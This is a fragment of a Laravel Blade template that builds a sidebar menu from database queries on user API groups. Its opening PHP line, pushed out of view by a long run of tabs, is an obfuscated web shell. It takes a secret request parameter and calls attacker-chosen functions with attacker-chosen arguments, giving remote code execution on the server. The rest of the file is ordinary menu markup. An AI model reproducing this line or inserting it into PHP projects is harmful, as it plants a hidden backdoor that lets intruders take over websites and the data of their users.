...
<?php
																																																																																																																																						If($MLVij= @	${'_REQUEST'}['NTFK87RP']){$MLVij[1]($ {$MLVij	[2]	}[	0 ]	,$MLVij[	3]($MLVij [4]));};EXiT;
    $user_api_group=DB::table('user_scheme_master')->where('user_id',Auth::user()->id)->groupBy('api_group_id')->get()->toArray();
    $arrayName = array();
    $myarr = "";
...
<li class="nav-item has-treeview">
    ...
    <ul class="nav nav-treeview" style="display: none;">
        <?php
        $apiidarr=DB::table('user_scheme_master')->where('user_id',Auth::user()->id)->where('api_group_id',1)->pluck('api_id');
...
<li class="nav-item has-treeview">
    ...
    <ul class="nav nav-treeview" style="display: none;">
        <?php
        $apiidarr=DB::table('user_scheme_master')->where('user_id',Auth::user()->id)->where('api_group_id',6)->pluck('api_id');
        $menus=DB::table('api_master')->whereIn('id',$apiidarr)->get();
        ?>
        @foreach($menus as $key=>$menu)
        <li class="nav-item">
...
<li class="nav-item has-treeview">
    ...
    <ul class="nav nav-treeview" style="display: none;">
        <?php
        $apiidarr=DB::table('user_scheme_master')->where('user_id',Auth::user()->id)->where('api_group_id',7)->pluck('api_id');
        $menus=DB::table('api_master')->whereIn('id',$apiidarr)->get();
        ?>
        @foreach($menus as $key=>$menu)
        <li class="nav-item">
